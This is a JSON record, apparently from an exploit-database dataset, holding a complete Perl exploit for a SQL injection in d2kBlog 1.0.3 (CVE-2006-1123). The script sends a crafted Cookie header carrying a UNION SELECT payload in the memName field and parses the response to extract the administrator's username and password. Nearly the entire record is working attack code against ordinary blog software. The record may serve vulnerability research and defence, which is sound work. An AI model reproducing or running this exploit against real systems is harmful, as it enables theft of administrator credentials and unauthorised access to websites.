{
  "id": "1569",
  "title": "d2kBlog 1.0.3 - &#039;memName&#039; SQL Injection",
  "cve": "CVE-2006-1123",
  "vuln_type": "sqli",
  "code": " #!/usr/bin/perl -w \r\n # D2KBLOG SQL injection \r\n # Discovered by : Farhad Koosha [ farhadkey [at} kapda.ir ]\r\n # Exploited by : devil_box [ devil_box [at} kapda.ir ]\r\n # member of : Kapda.ir - Security Science Researchers Institute of Iran (persianhacker.net)\r\n\r\nrequire LWP::UserAgent;\r\nrequire HTTP::Request;\r\nprint \"\\r\\n\\r\\n=-=-=-==================================================================-=-=-=\\r\\n\\r\\n\";\r\nprint \"\tKAPDA - Security Science Researchers Institute of Iran\\r\\n\\r\\n\";\r\nprint \"\tPoC for D2KBLOG SQL injection bug - Administrator Password Extractor\\r\\n\\r\\n\";\r\nprint \"\tOriginal Source : http://kapda.ir/advisory-287.html (persianhacker.net)\\r\\n\\r\\n\";\r\nprint \"\\r\\n=-=-=-==================================================================-=-=-=\\r\\n\";\r\n\r\n if (@ARGV != 2) \r\n { \r\n    print \"\tUsage: kapda_D2KBLOG_xpl.pl [Target Domain] [Vulnerable Page]\\n\\r\\n\"; \r\n    print \"\tex: kapda_D2KBLOG_xpl.pl www.target.com /blog/profile.asp\\n\\r\\n\";\r\n    exit (); \r\n } \r\n\r\n\r\nmy $ua = LWP::UserAgent->new(env_proxy => 1,keep_alive => 1,timeout => 30,);\r\n\r\nmy $Path = $ARGV[0];\r\n\r\nmy $Page = $ARGV[1];\r\n\r\nmy $URL = \"http://\".$Path.$Page;\r\n\r\nprint \"|***| Connecting to \".$URL.\" ...\\r\\n\";\r\n\r\n$r = HTTP::Request->new(GET => $URL.\"?action=edit\");\r\n\r\n$r->header( \"Cookie\" =>$Path.\"=memPassword=&memStatus=&memName=<!--'UNION%20ALL%20select%201,1,1,'**stxt**|UserName|:|'%2bmem_name%2b'|-=-|Password|:|'%2bmem_password%2b'|**etxt**',1,1,1,1,1,1,1,1,'Discovered%20and%20coded%20by%20farhadkey%20from%20KAPDA.ir'%20from%20blog_member%20where%20mem_status='SupAdmin'%20or%20'1'='-->\" );\r\n\r\n$res = $ua->request($r);\r\n\r\nprint \"|***| Connected !\\r\\n\";\r\n\r\nif ($res->is_success) {\r\n\r\n\tprint \"|***| Extracting Username and Password ...\\r\\n\\r\\n\";\r\n\r\n\tmy $results = $res->content; \r\n\r\n\twhile($results=~/\\\"\\*\\*stxt\\*\\*(.*?)\\*\\*etxt\\*\\*\\\"/ig){ print \"-=-> $1 \\r\\n\"; }\r\n\r\n\tprint \"\\r\\n\tExploit by Devil_Box\\r\\n\t\tDiscovery by Farhad koosha\\r\\n\\r\\n\";\r\n\r\n } else {\r\n\tdie \"\\r\\n|***| \".$res->status_line;\r\n }\r\n\r\n# milw0rm.com [2006-03-09]",
  "url": "https://www.exploit-db.com/exploits/1569"
}